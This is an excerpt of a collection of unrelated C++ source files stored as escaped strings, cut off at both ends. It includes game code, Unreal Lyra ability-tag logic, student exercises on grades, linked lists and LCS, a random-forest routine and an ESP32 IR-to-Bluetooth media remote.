(suit == \"CLUBS\")\n        return CLUBS;\n    if (suit == \"SPADES\")\n        return SPADES;\n    throw runtime_error(\"Invalid suit\");\n}\n\nRank stringToRank(const string& rank) {\n    if (rank == \"ACE\")\n        return ACE;\n    if (rank == \"TWO\")\n        return TWO;\n    if (rank == \"THREE\")\n        return THREE;\n    if (rank == \"FOUR\")\n        return FOUR;\n    if (rank == \"FIVE\")\n        return FIVE;\n    if (rank == \"SIX\")\n        return SIX;\n    if (rank == \"SEVEN\")\n        return SEVEN;\n    if (rank == \"EIGHT\")\n        return EIGHT;\n    if (rank == \"NINE\")\n        return NINE;\n    if (rank == \"TEN\")\n        return TEN;\n    if (rank == \"JACK\")\n        return JACK;\n    if (rank == \"QUEEN\")\n        return QUEEN;\n    if (rank == \"KING\")\n        return KING;\n    throw runtime_error(\"Invalid rank\");\n}\n\nChipType stringToChipType(const string& chipValue) {\n    if (chipValue == \"WHITE\")\n        return WHITE;\n    if (chipValue == \"RED\")\n        return RED;\n    if (chipValue == \"BLUE\")\n        return BLUE;\n    if (chipValue == \"GREEN\")\n        return GREEN;\n    if (chipValue == \"BLACK\")\n        return BLACK;\n    if (chipValue == \"PURPLE\")\n        return PURPLE;\n    if (chipValue == \"YELLOW\")\n        return YELLOW;\n    throw runtime_error(\"Invalid chip value\");\n}\n\n\nvector<int> fromFloatToChips(float bet) { /// transformam un float in chipsuri de cele 7 valori\n    vector<int> chips(7, 0); // Initialize a vector with 7 zeros\n    int remainingBet = bet;\n    for (int i = 6; i >= 0; --i) {\n        while (remainingBet >= value(static_cast<ChipType>(i + 1))) {\n            chips[i]++;\n            remainingBet -= value(static_cast<ChipType>(i + 1));\n        }\n    }\n    return chips;\n}\n\n\nclass TextureManager { /// clasa pentru a incarca texturi\nprivate:\n    unordered_map<string, Texture> textures;\n    unordered_map<string, Font> fonts;\n\npublic:\n    void loadTexture(const string& name, const string& filename); /// functie care incarca textura\n\n    Texture& getTexture(const string& name) { /// functie care returneaza textura\n        return textu",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n\n#include \"AbilitySystem/LyraAbilityTagRelationshipMapping.h\"\n\n\n#include UE_INLINE_GENERATED_CPP_BY_NAME(LyraAbilityTagRelationshipMapping)\n\nvoid ULyraAbilityTagRelationshipMapping::GetAbilityTagsToBlockAndCancel(const FGameplayTagContainer& AbilityTags, FGameplayTagContainer* OutTagsToBlock, FGameplayTagContainer* OutTagsToCancel) const\n{\n\t// Simple iteration for now\n\tfor (int32 i = 0; i < AbilityTagRelationships.Num(); i++)\n\t{\n\t\tconst FLyraAbilityTagRelationship& Tags = AbilityTagRelationships[i];\n\t\tif (AbilityTags.HasTag(Tags.AbilityTag))\n\t\t{\n\t\t\tif (OutTagsToBlock)\n\t\t\t{\n\t\t\t\tOutTagsToBlock->AppendTags(Tags.AbilityTagsToBlock);\n\t\t\t}\n\t\t\tif (OutTagsToCancel)\n\t\t\t{\n\t\t\t\tOutTagsToCancel->AppendTags(Tags.AbilityTagsToCancel);\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid ULyraAbilityTagRelationshipMapping::GetRequiredAndBlockedActivationTags(const FGameplayTagContainer& AbilityTags, FGameplayTagContainer* OutActivationRequired, FGameplayTagContainer* OutActivationBlocked) const\n{\n\t// Simple iteration for now\n\tfor (int32 i = 0; i < AbilityTagRelationships.Num(); i++)\n\t{\n\t\tconst FLyraAbilityTagRelationship& Tags = AbilityTagRelationships[i];\n\t\tif (AbilityTags.HasTag(Tags.AbilityTag))\n\t\t{\n\t\t\tif (OutActivationRequired)\n\t\t\t{\n\t\t\t\tOutActivationRequired->AppendTags(Tags.ActivationRequiredTags);\n\t\t\t}\n\t\t\tif (OutActivationBlocked)\n\t\t\t{\n\t\t\t\tOutActivationBlocked->AppendTags(Tags.ActivationBlockedTags);\n\t\t\t}\n\t\t}\n\t}\n}\n\nbool ULyraAbilityTagRelationshipMapping::IsAbilityCancelledByTag(const FGameplayTagContainer& AbilityTags, const FGameplayTag& ActionTag) const\n{\n\t// Simple iteration for now\n\tfor (int32 i = 0; i < AbilityTagRelationships.Num(); i++)\n\t{\n\t\tconst FLyraAbilityTagRelationship& Tags = AbilityTagRelationships[i];\n\n\t\tif (Tags.AbilityTag == ActionTag && Tags.AbilityTagsToCancel.HasAny(AbilityTags))\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t}\n\n\treturn false;\n}\n\n",
    "#include <iostream>\r\n#include<fstream>\r\n#include<iomanip>\r\nusing namespace std;\r\n//q3 functions\r\nvoid Input(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tifstream filein(\"grades.txt\");          // Open the file for reading\r\n\tif (filein.fail())             // Check if the file opening is successful\r\n\t{\r\n\t\tcout << \"Could not open file!\";\r\n\t\tsystem(\"pause\");\r\n\t\texit(0);\r\n\t}\r\n\r\n\tint temp;\r\n\t// Read the total number of records from the file\r\n\tfilein >> temp;\r\n\r\n\tchar chr;\r\n\tfilein.get(chr);\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\t// Read and store student names\r\n\t\tfilein.get(chr);\r\n\t\tfor (int j = 0; chr != ','; j++)\r\n\t\t{\r\n\t\t\tname[i * maximum_size + j] = chr;\r\n\t\t\tfilein.get(chr);\r\n\t\t}\r\n\r\n\t\t// Read and store Subject 1 grades\r\n\t\tfilein.get(chr);\r\n\t\twhile (chr != ',')\r\n\t\t{\r\n\t\t\tsubject1[i] = subject1[i] * 10 + (int)(chr - '0');\r\n\t\t\tfilein.get(chr);\r\n\t\t}\r\n\r\n\t\t// Read and store Subject 2 grades\r\n\t\tfilein.get(chr);\r\n\t\twhile (chr != ',')\r\n\t\t{\r\n\t\t\tsubject2[i] = subject2[i] * 10 + (int)(chr - '0');\r\n\t\t\tfilein.get(chr);\r\n\t\t}\r\n\r\n\t\t// Read and store Subject 3 grades\r\n\t\tfilein >> subject3[i];\r\n\r\n\t\tfilein.get(chr);\r\n\t}\r\n\tfilein.close();\r\n}\r\nvoid Output(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tcout << left << \"RECORD  NAME           SUBJECT1  SUBJECT2  SUBJECT3\\n\";\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\tcout << setw(8) << i + 1;\r\n\t\tfor (int j = 0; j < maximum_size; j++)\r\n\t\t\tcout << name[i * maximum_size + j];\r\n\t\tcout << setw(10) << subject1[i] << setw(10) << subject2[i] << subject3[i] << \"\\n\\n\";\r\n\t}\r\n}\r\nvoid Students_average(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tcout << left << \"RECORD  NAME           AVERAGE\\n\";\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\tcout << setw(8) << i + 1;\r\n\t\tfor (int j = 0; j < maximum_size; j++) cout << name[i * maximum_size + j];\r\n\t\tcout << fixed << setprecision(3) << showpoint << (subject1[i] + subject2[i] + subject3[i]) / 3.0 << \"\\n\\n\";\r\n\t}\r\n}\r\nvoid Subjects_average(int subject1[], int subject2[], int subject3[], const int records)\r\n{\r\n\tcout << \"Subject 1: \";\r\n\tdouble average = 0;\r\n\tfor (int i = 0; i < records; i++)average += subject1[i];\r\n\tcout << fixed << setprecision(3) << showpoint << average / records;\r\n\tcout << \"\\nSubject 2: \";\r\n\taverage = 0;\r\n\tfor (int i = 0; i < records; i++)average += subject2[i];\r\n\tcout << fixed << setprecision(3) << showpoint << average / records;\r\n\tcout << \"\\nSubject 3: \";\r\n\taverage = 0;\r\n\tfor (int i = 0; i < records; i++)average += subject3[i];\r\n\tcout << fixed << setprecision(3) << showpoint << average / records << \"\\n\\n\";\r\n}\r\n// Function to find and display student with the highest average and subject with the lowest average\r\nvoid Highest_and_lowest_average(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tcout << \"Student with Highest Average:\\n\\n\";\r\n\tint highest_index = 0;\r\n\tdouble highest = -1;\r\n\tfor (int i = 0; i < records; i++)\r\n\t\tif ((subject1[i] + subject2[i] + subject3[i]) / 3.0 > highest)\r\n\t\t{\r\n\t\t\thighest = (subject1[i] + subject2[i] + subject3[i]) / 3.0;\r\n\t\t\thighest_index = i;\r\n\t\t}\r\n\tcout << left << \"RECORD  NAME           AVERAGE\\n\";\r\n\tcout << setw(8) << highest_index + 1;\r\n\tfor (int j = 0; j < maximum_size; j++)\r\n\t\tcout << name[highest_index * maximum_size + j];\r\n\tcout << fixed << setprecision(3) << showpoint << highest << \"\\n\\n\";\r\n\tcout << \"Subject with Lowest Average:\\n\\n\";\r\n\tint lowest_number = 0;\r\n\tdouble lowest = 100, tempr = 0;\r\n\tfor (int i = 0; i < records; i++)tempr = tempr + subject1[i];\r\n\tif (tempr / records < lowest) { lowest = tempr / records; lowest_number = 1; }\r\n\ttempr = 0;\r\n\tfor (int i = 0; i < records; i++)tempr = tempr + subject2[i];\r\n\tif (tempr / records < lowest) { lowest = tempr / records; lowest_number = 2; }\r\n\ttempr = 0;\r\n\tfor (int i = 0; i < records; i++)tempr = tempr + subject3[i];\r\n\tif (tempr / records < lowest) { lowest = tempr / records; lowest_number = 3; }\r\n\tcout << \"SUBJECT  AVERAGE\\n\";\r\n\tcout << setw(9) << lowest_number << fixed << setprecision(2) << showpoint << lowest << \"\\n\\n\";\r\n}\r\n// Function to perform various analyses and write results to \"analysis.txt\"\r\nvoid Analysis(char name[], int subject1[], int subject2[], int subject3[], const int maximum_size, const int records)\r\n{\r\n\tofstream fileout(\"analysis.txt\");\r\n\tfileout << \"Grades:\\n\\n\";\r\n\tfileout << left << \"RECORD  NAME           SUBJECT1  SUBJECT2  SUBJECT3\\n\";\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\tfileout << setw(8) << i + 1;\r\n\t\tfor (int j = 0; j < maximum_size; j++) fileout << name[i * maximum_size + j];\r\n\t\tfileout << setw(10) << subject1[i] << setw(10) << subject2[i] << subject3[i] << \"\\n\\n\";\r\n\t}\r\n\tfileout << \"\\nAverage of Students:\\n\\n\";\r\n\tfileout << left << \"RECORD  NAME           AVERAGE\\n\";\r\n\tfor (int i = 0; i < records; i++)\r\n\t{\r\n\t\tfileout << setw(8) << i + 1;\r\n\t\tfor (int j = 0; j < maximum_si",
    "/*-------------------------------------------------------------------------------\n  This file is part of generalized-random-forest.\n\n  grf is free software: you can redistribute it and/or modify\n  it under the terms of the GNU General Public License as published by\n  the Free Software Foundation, either version 3 of the License, or\n  (at your option) any later version.\n\n  grf is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n  GNU General Public License for more details.\n\n  You should have received a copy of the GNU General Public License\n  along with grf. If not, see <http://www.gnu.org/licenses/>.\n #-------------------------------------------------------------------------------*/\n\n#include \"SplitFrequencyComputer.h\"\n\nnamespace grf {\n\nstd::vector<std::vector<size_t>> SplitFrequencyComputer::compute(const Forest& forest,\n                                                                 size_t max_depth) const {\n  size_t num_variables = forest.get_num_variables();\n  std::vector<std::vector<size_t>> result(max_depth, std::vector<size_t>(num_variables));\n\n  for (const auto& tree : forest.get_trees()) {\n    const std::vector<std::vector<size_t>>& child_nodes = tree->get_child_nodes();\n\n    size_t depth = 0;\n    std::vector<size_t> level = {tree->get_root_node()};\n\n    while (level.size() > 0 && depth < max_depth) {\n      std::vector<size_t> next_level;\n\n      for (size_t node : level) {\n        if (tree->is_leaf(node)) {\n          continue;\n        }\n\n        size_t variable = tree->get_split_vars().at(node);\n        result[depth][variable]++;\n\n        next_level.push_back(child_nodes[0][node]);\n        next_level.push_back(child_nodes[1][node]);\n      }\n\n      level = next_level;\n      depth++;\n    }\n  }\n  return result;\n}\n\n} // namespace grf\n",
    "#include <Arduino.h>\n#include <BleKeyboard.h>\n#include <IRremote.hpp>\n\n// update pin number as per your ESP32 board\n#define IR_RECEIVE_PIN 15 // D15\n\nBleKeyboard bleKeyboard(\"Macro Remote\", \"onkar\", 100);\n\nvoid setup()\n{\n  // to debug the code using IDE \n  // uncomment following line and all 'Serial.println' lines\n  // Serial.begin(115200);\n\n  // Bluetooth connection indicator\n  pinMode(2, OUTPUT);\n\n  bleKeyboard.begin();\n  IrReceiver.begin(IR_RECEIVE_PIN, ENABLE_LED_FEEDBACK);\n\n  // printActiveIRProtocols(&Serial);\n  // Serial.println(\"device initialized\");\n}\n\nvoid loop()\n{\n  if (bleKeyboard.isConnected())\n  {\n    digitalWrite(2, HIGH);\n    if (IrReceiver.decode())\n    {\n      Serial.println(IrReceiver.decodedIRData.decodedRawData, HEX); // Print \"old\" raw data\n      // IrReceiver.printIRResultShort(&Serial); // Print complete received data in one line\n      // IrReceiver.printIRSendUsage(&Serial);   // Print the statement required to send this data\n      switch (IrReceiver.decodedIRData.command)\n      {\n      // *\n      case 0x16:\n        bleKeyboard.write(KEY_MEDIA_MUTE);\n        break;\n      // ok\n      case 0x1c:\n        bleKeyboard.write(KEY_MEDIA_PLAY_PAUSE);\n        break;\n      // up\n      case 0x18:\n        bleKeyboard.write(KEY_MEDIA_VOLUME_UP);\n        break;\n      // down\n      case 0x52:\n        bleKeyboard.write(KEY_MEDIA_VOLUME_DOWN);\n        break;\n      // left\n      case 0x8:\n        bleKeyboard.write(KEY_MEDIA_PREVIOUS_TRACK);\n        break;\n      // right\n      case 0x5A:\n        bleKeyboard.write(KEY_MEDIA_NEXT_TRACK);\n        break;\n      default:\n        bleKeyboard.press(KEY_RIGHT_CTRL);\n        bleKeyboard.press(KEY_RIGHT_SHIFT);\n        switch (IrReceiver.decodedIRData.command)\n        {\n          // 1\n          case 0x45:\n            bleKeyboard.press(KEY_F1);\n            break;\n          // 2\n          case 0x46:\n            bleKeyboard.press(KEY_F2);\n            break;\n          // 3\n          case 0x47:\n            bleKeyboard.press(KEY_F3);\n            break;\n          // 4\n          case 0x44:\n            bleKeyboard.press(KEY_F4);\n            break;\n          // 5\n          case 0x40:\n            bleKeyboard.press(KEY_F5);\n            break;\n          // 6\n          case 0x43:\n            bleKeyboard.press(KEY_F6);\n            break;\n          // 7\n          case 0x7:\n            bleKeyboard.press(KEY_F7);\n            break;\n          // 8\n          case 0x15:\n            bleKeyboard.press(KEY_F8);\n            break;\n          // 9\n          case 0x9:\n            bleKeyboard.press(KEY_F9);\n            break;\n          // 0 - mid volume\n          case 0x19:\n            bleKeyboard.press(KEY_F10);\n            break;\n          // # - high volume\n          case 0xD:\n            bleKeyboard.press(KEY_F11);\n            break;\n        }\n      }\n      delay(50);\n      bleKeyboard.releaseAll();\n      delay(100);\n      IrReceiver.resume();\n    }\n  }\n  else\n  {\n    digitalWrite(2, LOW);\n    delay(5000);\n  }\n}\n\n/*\nKey codes of my remote\n1 - 0x45\n2 - 0x46\n3 - 0x47\n4 - 0x44\n5 - 0x40\n6 - 0x43\n7 - 0x7\n8 - 0x15\n9 - 0x9\n* - 0x16\n0 - 0x19\n# - 0xD\nup - 0x18\ndown - 0x52\nleft - 0x8\nright - 0x5A\nok - 0x1C\n*/",
    "#include<iostream>\n#include<vector>\nusing namespace std;\n\n    vector<int> spiralOrder(vector<vector<int> > matrix) {\n        \n        \n        vector<int> ans;\n        int row = matrix.size();\n        int col = matrix[0].size();\n        \n        int count = 0;\n        int total = row*col;\n        \n        //index initialisation\n        int startingRow = 0;\n        int startingCol = 0;\n        int endingRow = row-1;\n        int endingCol = col-1;\n        \n        \n        while(count < total) {\n            \n            //print starting row\n            for(int index = startingCol; count < total && index<=endingCol; index++) {\n                ans.push_back(matrix[startingRow][index]);\n                count++;\n                cout<<matrix[startingRow][index]<<\" \";\n            }\n            startingRow++;\n            \n            //print ending column\n            for(int index = startingRow; count < total && index<=endingRow; index++) {\n                ans.push_back(matrix[index][endingCol]);\n                count++;\n                cout<<matrix[index][endingCol]<<\" \";\n            }\n            endingCol--;\n            \n            //print ending row\n            for(int index = endingCol; count < total && index>=startingCol; index--) {\n                ans.push_back(matrix[endingRow][index]);\n                count++;\n                cout<<matrix[endingRow][index]<<\" \";\n            }\n            endingRow--;\n            \n            //print starting column\n            for(int index = endingRow; count < total && index>=startingRow; index--) {\n                ans.push_back(matrix[index][startingCol]);\n                count++;\n                cout<<matrix[index][startingCol]<<\" \";\n            }\n            startingCol++;\n        } \n        return ans;\n    }\n\nint main(){\n    vector<vector<int> > arr={\n    {1,2,3},\n    {4,5,6},\n    {7,8,9}};\n    spiralOrder(arr);\n}",
    "#include \"iostream\"\nusing namespace std;\nconst int max_node = 10;\nstruct node\n{\n    int book_no = -1;\n    string title;\n    string author;\n    string isbn;\n    int availability_stat;\n    int next = 0;\n};\nnode a[max_node];\nint create()\n{\n    int head, i;\n    cout << \"Enter index of first node: \";\n    cin >> i;\n    head = i;\n    while (i != 0)\n    {\n        cout << \"Enter book number : \" << endl;\n        cin >> a[i].book_no;\n        cout << endl;\n        cout << \"Enter Title of the Book : \";\n        cin >> a[i].title;\n        cout << endl;\n        cout << \"Enter Author : \";\n        cin >> a[i].author;\n        cout << \"Enter ISBN : \";\n        cin >> a[i].isbn;\n        cout << endl;\n        cout << \"Enter availability status : \";\n        cin >> a[i].availability_stat;\n        cout << endl;\n        cout << \"Enter index of next book(press 0 to stop) : \";\n        cin >> a[i].next;\n        cout << endl;\n        i = a[i].next;\n    }\n    return head;\n}\nvoid display_search(int head)\n{\n    cout << \"\\n\\nBook No\\t|\\tTitle\\t|\\tAuthor\\t|\\tISBN\\t| Availability\\t|\\tbook pos.\\t|\\n\\n\";\n    cout << \"--------------------------------------------------------------------------\\n\";\n    int i = head;\n    cout << a[i].book_no << \"\\t|\\t\" << a[i].title << \"\\t|\\t\" << a[i].author << \"\\t|\\t\" << a[i].isbn << \"\\t|\\t\" << a[i].availability_stat << i << \"\\t|\\n\";\n}\nvoid display(int head)\n{\n    int i = head;\n    cout << \"\\n\\ncount\\t|\\tBook No\\t|\\tTitle\\t|\\tAuthor\\t|\\tISBN\\t| Availability\\t|  book pos.\\t|  next\\n\\n \";\n    cout << \"-------------------------------------------------------------------------------------------------------------------------\\n\";\n    int count = 1;\n    while (i != 0)\n    {\n        if (a[i].book_no != -1)\n        {\n            cout << count << \"\\t|\\t\" << a[i].book_no << \"\\t|\\t\" << a[i].title << \"\\t|\\t\" << a[i].author << \"\\t|\\t\" << a[i].isbn << \"\\t|\\t\" << a[i].availability_stat << \"\\t|\\t\" << i << \"\\t|\\t\" << a[i].next << \"\\t|\\n \";\n        }\n        count++;\n        i = a[i].next;\n    }\n    cout << \"NULL\" << endl;\n}\nvoid insert()\n{\n    int new_book_no, temp;\n    string new_title, new_author, new_isbn;\n    int new_availability_stat;\n\n    cout << \"Enter book number : \" << endl;\n    cin >> new_book_no;\n    cout << endl;\n    cout << \"Enter Title of the Book : \";\n    cin >> new_title;\n    cout << endl;\n    cout << \"Enter Author : \";\n    cin >> new_author;\n    cout << \"Enter ISBN : \";\n    cin >> new_isbn;\n    cout << endl;\n    cout << \"Enter availability status : \";\n    cin >> new_availability_stat;\n    cout << endl;\n    cout << \"Enter book_no after which you want to insert: \";\n    cin >> temp;\n    for (int i = 0; i < max_node; i++)\n    {\n        if (a[i].book_no == temp)\n        {\n            for (int j = i + 1; j < max_node; j++)\n            {\n                if (a[j].book_no == -1)\n                {\n                    a[j].book_no = new_book_no;\n                    a[j].title = new_title;\n                    a[j].author = new_author;\n                    a[j].isbn = new_isbn;\n                    a[j].availability_stat = new_availability_stat;\n                    a[j].next = a[i].next;\n                    a[i].next = j;\n                    return;\n                }\n            }\n        }\n    }\n    cout << \"Element not found\" << endl;\n}\nint delete_data(int head)\n{\n    int temp;\n    cout << \"Enter book_no number you want to delete : \";\n    cin >> temp;\n    int prev = 0;\n    int current = head;\n    if (a[current].book_no == temp)\n    {\n        a[current].book_no = -1;\n        head = a[current].next;\n    }\n    while (current != 0)\n    {\n        prev = current;\n        current = a[current].next;\n        if (a[current].book_no == temp)\n        {\n            a[current].book_no = -1;\n            a[prev].next = a[current].next;\n            a[current].next = 0;\n            return 0;\n        }\n    }\n    cout << \"Element not found\";\n    return head;\n}\n\nvoid search(int head)\n{\n    int val;\n    cout << \"Enter element you want to find: \";\n    cin >> val;\n    int i = head;\n    bool flag = true;\n    while (i != 0)\n    {\n        if (a[i].book_no == val)\n        {\n            cout << \"book_no found\" << endl;\n            display_search(i);\n            flag = false;\n        }\n        i = a[i].next;\n    }\n    if (flag == true)\n    {\n        cout << \"book_no not found\";\n    }\n}\nint main()\n{\n    int head = create();\n    cout << \" Library Created... \" << endl;\n    int ch;\n    do\n    {\n        cout << \"Menu\\n1)insert\\n2)display\\n3)delete_book_no\\n4)search\\n5)exit\\nEnter your choice : \";\n        cin >> ch;\n        switch (ch)\n        {\n        case 1:\n            insert();\n            break;\n        case 2:\n            display(head);\n            break;\n        case 3:\n            delete_data(head);\n            break;\n        case 4:\n            search(head);\n            break;\n        case 5:\n            exit(0);\n        }\n        cout << \"\\ndo you want to continue(1/0) : \";\n        cin >> ch;\n    } while (ch == 1);\n    return 0;\n}",
    "//A program that keeps track of the cars parked in MEDIU's parking zone\r\n#include <iostream>\r\nusing namespace std;\r\n// make a struct that contains the cars' information\r\nstruct car {\r\n  string ownername, brand, model, make, platenumber;\r\n  int year, oldestmake;\r\n};\r\n\r\n\r\nint main ()\r\n{\r\n  string model, brand, ownername, platenumber, oldestmodel;\r\n  int i, carnum, proton = 0, maxyear = 2022, oldestmake = 0;\r\n  car cars[carnum];\r\n  \r\n  cout << \"This is a program that keeps track of the cars parked in MEDIU's parking zone.\" << endl << endl;\r\n  cout << \"Enter the number of cars you will enter: \";\r\n  cin >> carnum; // number of cars that will be inputed (number of times the loop will repeat)\r\n  \r\n  // make a loop which includes asking for each of the desired car information\r\n  for (int i = 0; i < carnum; i++)\r\n{\r\n\t\r\ncout << \"Enter owner name: \";\r\ncin >> cars[i].ownername;\r\ncout << \"Enter brand: \";\r\ncin >> cars[i].brand;\r\ncout << \"Enter model: \";\r\ncin >> cars[i].model;\r\ncout << \"Enter make: \";\r\ncin >> cars[i].make;\r\ncout << \"Enter plate number: \";\r\ncin >> cars[i].platenumber;\r\ncout << \"Enter year: \";\r\ncin >> cars[i].year;\r\ncout << endl;\r\n\r\n// get the oldest brand and model\r\nif (cars[i].year < maxyear) \r\n{\r\nbrand = cars[i].brand;\r\nmodel = cars[i].model;\r\n\r\n}  \r\n// count the number of times the word proton is entered in the model\r\n    if (cars[i].model == \"proton\") \r\n    { \r\n    proton++; \r\n    } \r\n}\r\n\r\ncout << endl << endl;\r\n\r\ncout << \"The oldest car brand is: \" << brand << endl; // display the oldest car brad\r\ncout << \"The oldest car model is: \" << model << endl; // display the oldest car model\r\ncout << \"The number of proton car(s) parked there is: \" << proton++ << endl; // display the number of times the word proton is repeated\r\n    \r\n\r\n    return 0;\r\n}\r\n",
    "// Include necessary libraries\n#include <bits/stdc++.h>\nusing namespace std;\n    string str1, str2;\n\nint main()\n{\n    string str1, str2;\n    cin>>str2>>str1;\n\n\n\n    // Get the lengths of the two strings\n    int n = str1.size();\n    int m = str2.size();\n\n    // Create a 2D array for dynamic programming to find LCS\n    int lcs[n + 1][m + 1];\n\n    // Initialize the array with zeros\n    memset(lcs, 0, sizeof(lcs));\n\n    // Fill the dynamic programming array\n    for (int i = 1; i <= n; i++)\n    {\n        for (int j = 1; j <= m; j++)\n        {\n            if (str1[i - 1] == str2[j - 1])\n            {\n                // If characters match, add 1 to the previous diagonal value\n                lcs[i][j] = lcs[i - 1][j - 1] + 1;\n            }\n            else\n            {\n                // If characters don't match, take the maximum of the top and left values\n                lcs[i][j] = max(lcs[i - 1][j], lcs[i][j - 1]);\n            }\n        }\n    }\n\n    // Display the dynamic programming array\n    for (int i = 0; i <= n; i++)\n    {\n        for (int j = 0; j <= m; j++)\n        {\n            cout << lcs[i][j] << \" \";\n        }\n        cout << endl;\n    }\n\n    // Initialize indices for backtracking\n    int i = n, j = m;\n\n    // Initialize an empty string to store the LCS\n    string lcs_string;\n\n    // Backtrack to find the LCS string\n    while (i > 0 && j > 0)\n    {\n        if (str1[i - 1] == str2[j - 1])\n        {\n            // If characters match, add the character to the LCS\n            lcs_string = str1[i - 1] + lcs_string;\n            i--;\n            j--;\n        }\n        else if (lcs[i - 1][j] > lcs[i][j - 1])\n        {\n            // Move to the direction with a higher LCS value\n            i--;\n        }\n        else\n        {\n            j--;\n        }\n    }\n\n    // Display an empty line for clarity\n    cout << endl;\n\n    // Display the length of the Longest Common Subsequence\n    cout << \"Longest Common Subsequence Length: \" << lcs[n][m] << endl;\n\n    // Display the Longest Common Subsequence itself\n    cout << \"Longest Common Subsequence: \" << lcs_string << endl;\n\n    return 0;\n}\n",
    "// Game Name: Cosmic Climb\r\n// Written by: Caden Leedy\r\n// Date: 12/06/2022\r\n//\r\n// Instructions: Try to climb as high as possible without falling by bouncing off the white platforms. Hover over the screen\r\n// with the mouse and move it left or right to move the ball. \r\n//\r\n\r\n#include \"graphics.h\"\r\n#include <iostream>\r\n#include <string>\r\n#include <random>\r\n#include <cmath>\r\n#include <stdio.h>\r\n#include <string>\r\n\r\n\r\nusing namespace std;\r\n\r\nconst int BACKGROUND_COLOR = BLUE;\r\nconst int TEXT_COLOR = WHITE;\r\nconst int ARRAYSIZE = 9;\r\nconst int INITVEL = -26;\r\n\r\nrandom_device myEngine;\r\nuniform_real_distribution<double> randomReal(0.0, 1.0);\r\n\r\n\r\n//enumerated types:\r\n\r\n//defines enumerated type for the different types of platforms\r\nenum PlatformType { STATIC, BROKEN, MOVING };\r\n\r\n//defines enumerated type for different scenarios of the ball landing on a platform\r\nenum Landed { LEFT, MIDDLE, RIGHT };\r\n\r\n//set gravity\r\nconst double GRAVITY = 1.00;\r\n\r\n//constant variables for starting position of ball for each new game\r\nconst double RESETX = 250;\r\nconst double RESETY = 750;\r\n\r\n\r\n//Structure definitions:\r\n\r\n//defines structure for the player which is the ball\r\nstruct Player {\r\n\t// Variables to keep track of position, previous position, and velocity\r\n\tdouble x, y, prevX, prevY, velX, velY, gravity = GRAVITY;\r\n\tint color;\r\n\tbool alive;\r\n\r\n\r\n\r\n\t//a \"constructor\" function\r\n\tPlayer(int c) {\r\n\t\tcolor = c;\r\n\t\talive = true;\r\n\r\n\t\t// Set Initial Position\r\n\t\tx = RESETX;\r\n\t\ty = RESETY;\r\n\r\n\t\t//set previous position to be current position\r\n\t\tprevX = x;\r\n\t\tprevY = y;\r\n\r\n\t\t// Set Initial Velocity\r\n\t\tvelX = 0;\r\n\t\tvelY = INITVEL;\r\n\t} // end Player() constructor function\r\n\r\n\tvoid move() {\r\n\r\n\t\t//set previous position equal to current position to keep track of old position\r\n\t\tprevX = x;\r\n\t\tprevY = y;\r\n\r\n\t\t//erase old position\r\n\t\tsetcolor(BLUE);\r\n\t\tsetfillstyle(SOLID_FILL, BLUE);\r\n\t\tfillellipse(prevX, prevY, 20, 20);\r\n\r\n\t\t//move ball and redraw it\r\n\t\tx += velX;\r\n\t\ty += velY;\r\n\r\n\t\t//if ball goes off one side of the screen, makes it re-enter on the other side\r\n\t\tif (x <= -15) {\r\n\t\t\tx = 515;\r\n\t\t}\r\n\t\telse if (x >= 515) {\r\n\t\t\tx = -15;\r\n\t\t}\r\n\r\n\r\n\t\tsetcolor(color);\r\n\t\tsetfillstyle(SOLID_FILL, color);\r\n\t\tfillellipse(x, y, 20, 20);\r\n\r\n\r\n\r\n\t\tvelY += gravity; //change the velocity  by the acceleration due to gravity\r\n\r\n\r\n\t\tvelX = (static_cast<double>((250 - mousex()) * (-1))) / 10;\r\n\r\n\t}\r\n};\r\n\r\n\r\n//defines structure for the platforms\r\nstruct Platform {\r\n\tdouble x, y, prevX, prevY, velX, velY;\r\n\tPlatformType type;\r\n\tbool alive;\r\n\tbool spring;\r\n\r\n\r\n\t//function to calculate distance from player center to top left corner of platform\r\n\t// input the player.x and player.y\r\n\tdouble Ldistance(double ballx, double bally) {\r\n\t\tdouble distance = sqrt(pow(ballx - (x - 40), 2) + pow(bally - (y), 2));\r\n\t\treturn distance;\r\n\t}\r\n\t//function to calculate distance from player center to top right corner of platform\r\n\t// input the ball.x and ball.y\r\n\tdouble Rdistance(double ballx, double bally) {\r\n\t\tdouble distance = sqrt(pow(ballx - (x + 40), 2) + pow(bally - (y), 2));\r\n\t\treturn distance;\r\n\t}\r\n\r\n\t//function that determines if the ball landed on the plaform, \r\n\t//and returns whether it hit the left rounded edge, somewhere in the middle, or the right rounded edge of the platform\r\n\t//input ball.x, ball.y, and ball.velY\r\n\tLanded landedOn(double ballx, double bally, double prevbally, double vely) {\r\n\t\tif (vely > 0) {\r\n\t\t\tif (((ballx - 15) <= (x + 40)) && ((ballx + 15) >= (x - 40)) && ((bally + 20) >= (y - 5)) && ((prevbally + 20) <= (y - 5))) {\r\n\t\t\t\t//if ((ballx <= (x + 40)) && (ballx >= (x - 40)) && ((bally) >= (y + 5)) && ((y-bally) <=25)) {\r\n\t\t\t\treturn MIDDLE;\r\n\t\t\t}\r\n\t\t\t/*else if ((Ldistance(ballx, bally) <= 25) && ballx < (x - 40)) {\r\n\t\t\t\treturn LEFT;\r\n\t\t\t}\r\n\t\t\telse if ((Rdistance(ballx, bally) <= 25) && ballx > (x + 40)) {\r\n\t\t\t\treturn RIGHT;\r\n\t\t\t}\r\n\t\t\t*/\r\n\t\t}\r\n\t}\r\n\r\n\tvoid move(bool moveY) {\r\n\t\t//erase old\r\n\t\tsetcolor(BLUE);\r\n\t\tsetfillstyle(SOLID_FILL, BLUE);\r\n\t\tbar(x - 40, y + 5, x + 40, y - 5);\r\n\t\tpieslice(x - 40, y, 90, 270, 